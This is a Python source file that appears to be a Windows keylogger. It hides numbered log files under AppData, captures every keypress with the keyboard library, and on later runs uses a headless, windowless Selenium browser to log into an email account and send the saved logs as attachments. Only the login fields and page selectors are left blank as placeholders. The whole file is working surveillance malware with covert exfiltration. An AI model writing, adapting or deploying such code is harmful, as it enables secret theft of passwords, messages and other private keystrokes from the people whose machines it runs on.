
from selenium import webdriver
from subprocess import CREATE_NO_WINDOW
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.service import Service as cs
from selenium.webdriver.firefox.service import Service as fs
from selenium.webdriver.edge.service import Service as es
from selenium.webdriver.chrome.options import Options as co
from selenium.webdriver.firefox.options import Options as fo
from selenium.webdriver.edge.options import Options as eo
from webdriver_manager.chrome import ChromeDriverManager
from webdriver_manager.firefox import GeckoDriverManager
from webdriver_manager.microsoft import EdgeChromiumDriverManager
import keyboard, random
import time, os

def get_service(drivers_list):
    for browser in drivers_list:
        try:
            driver_service = eval(drivers_list[browser])
        except:
            pass
        else:
            return driver_service, browser
        
def get_option(browser, options_list):
    for browser_name in options_list:
        if browser_name == browser:
            return eval(options_list[browser_name])

def upload_files(attach_button, previous_folder):
    for file_name in os.listdir(previous_folder):
        attach_button.send_keys(os.path.join(previous_folder, file_name))
        time.sleep(5)

def check(maiusc):
    if maiusc:
        return False
    return True

def write_text(new_text, path, file_name):
    path = os.path.join(path, file_name)
    file = open(path, "a") 
    file.write(new_text)
    file.close()

user_folder = os.path.expanduser("~")
path = os.path.join(user_folder, "AppData")

if not os.path.exists(path):
    path = user_folder + r"\OneDrive\AppData"

logs_path = path + r"\packages"
file_name = str(random.randrange(1000000, 1000000000000000, 1000000)) + ".dcx"
folder_path = os.path.join(logs_path, file_name[0:-4])

browser = ""
email_url = "" #enter the URL of the e-mail that will be used to log in

drivers_list = {"chrome" : "cs(ChromeDriverManager().install())",
                "firefox" : "fs(GeckoDriverManager().install())",
                "edge" : "es(EdgeChromiumDriverManager().install())"}

options_list = {"chrome" : "co()", "firefox": "fo()", "edge": "eo()"}

time.sleep(180)

#initializes the program by checking if it has already been used
if not os.path.exists(logs_path):
    os.mkdir(logs_path)
    os.mkdir(folder_path)
    os.system("type nul > " + os.path.join(folder_path, file_name))
else:
    file_name = str(int(os.listdir(logs_path)[-1]) + 1)
    #sends the files relating to the last session via email
    try:
        driver_service, browser = get_service(drivers_list)
    except:
        folder_path = os.listdir(logs_path)[-1]
        file_name = os.listdir(logs_path)[-1] + ".dcx"
    else:
        previous_folder = os.path.join(logs_path, str(int(file_name)-1))
        if not len(os.listdir(previous_folder)) == 0:
            driver_service.creationflags = CREATE_NO_WINDOW
            driver_options = get_option(browser, options_list)
            driver_options.add_argument("headless")
            driver_options.add_argument('window-size=1920x1080')
            driver = eval("webdriver." + browser.title() + "(service = driver_service, options = driver_options)")   
            driver.get(email_url)
            time.sleep(10)
            #THIS IS JUST AN EXAMPLE:
            #look for the email field in which the email will be written and the e-mail of your choice
            driver.find_element(By.ID, "").send_keys("")
            time.sleep(10)
            #look for the password field in which the password will be written and the password of your choice
            driver.find_element(By.ID, "").send_keys("")
            time.sleep(10)
            #look for your login button
            driver.find_element(By.CSS_SELECTOR, "").click()
            time.sleep(10)
            #look for your compose button
            driver.find_element(By.LINK_TEXT, "").click()
            time.sleep(10)
            #look for the recipient email field in which the recipient email will be written
            driver.find_element(By.CLASS_NAME, "").send_keys("")
            time.sleep(10)
            #look for the subject field in which the subject will be written
            driver.find_element(By.NAME, "").send_keys(str(int(file_name)-1))
            time.sleep(10)
            #look for the attach_button
            attach_button = driver.find_element(By.CSS_SELECTOR, "")
            upload_files(attach_button, previous_folder)
            time.sleep(10)
            #look for the send button
            driver.find_element(By.CLASS_NAME, "").click()
            time.sleep(5)
        driver.close()
        folder_path = os.path.join(logs_path, file_name)
        os.mkdir(folder_path)
        file_name = file_name + ".dcx"
        
write_text(folder_path + "\n", path, "98349098023490.dcx")

text = ""

maiusc = False
running = True
while running:
    #captures every key pressed on the keyboard
    event = keyboard.read_event()
    if event.event_type == "down":
        if len(event.name) > 1:
            if event.name == "space":
                text += " "
            elif event.name == "backspace":
                text = text[0:-1]
            elif event.name == "enter":
                text += "\n"
                write_text(text, folder_path, file_name)
                text = ""
            elif event.name == "bloc maiusc":
                maiusc = check(maiusc)
        else:
            if not maiusc:
                text += event.name
                continue
            text += event.name.upper()
